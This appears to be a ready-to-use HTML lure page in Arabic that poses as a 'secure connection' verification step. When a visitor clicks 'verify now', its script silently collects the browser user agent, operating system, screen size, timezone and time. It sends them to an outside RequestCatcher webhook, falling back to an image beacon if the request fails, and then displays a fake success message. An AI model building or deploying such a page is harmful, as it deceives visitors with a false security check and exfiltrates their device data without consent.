<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>تأمين الاتصال</title>
    <style>
        body { margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f2f2f2; font-family: system-ui; }
        .card { background: white; padding: 30px; border-radius: 20px; text-align: center; width: 90%; max-width: 350px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
        h2 { margin: 10px 0; color: #333; }
        p { color: #777; font-size: 14px; margin-bottom: 20px; }
        .btn { background: #007bff; color: white; border: none; padding: 12px; width: 100%; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; }
        .btn.green { background: #28a745; }
        .status { margin-top: 10px; color: #28a745; font-weight: bold; display: none; }
    </style>
</head>
<body>
    <div class="card" id="card">
        <h2>🔐 تأمين الاتصال</h2>
        <p>عليك الضغط على الزر لإكمال التحقق</p>
        <button class="btn" id="sendBtn">تحقق الآن</button>
        <div class="status" id="status">✅ تم</div>
    </div>

    <script>
        document.getElementById('sendBtn').addEventListener('click', function() {
            const btn = this;
            const status = document.getElementById('status');

            const ua = navigator.userAgent;
            let os = "Unknown";
            if (ua.includes('Windows')) os = "Windows";
            else if (ua.includes('Mac')) os = "macOS";
            else if (ua.includes('iPhone')) os = "iOS";
            else if (ua.includes('Android')) os = "Android";

            const data = {
                ua: ua,
                os: os,
                screen: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString()
            };

            // ================================================
            // الرابط الخاص بك (من RequestCatcher)
            // ================================================
            const webhook = 'https://bhaith.requestcatcher.com';

            fetch(webhook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).then(() => {
                btn.classList.add('green');
                btn.innerText = "تم التحقق";
                status.style.display = "block";
            }).catch(() => {
                const qs = new URLSearchParams(data).toString();
                new Image().src = `${webhook}?${qs}`;
                btn.classList.add('green');
                btn.innerText = "تم التحقق";
                status.style.display = "block";
            });
        });
    </script>
</body>
</html>
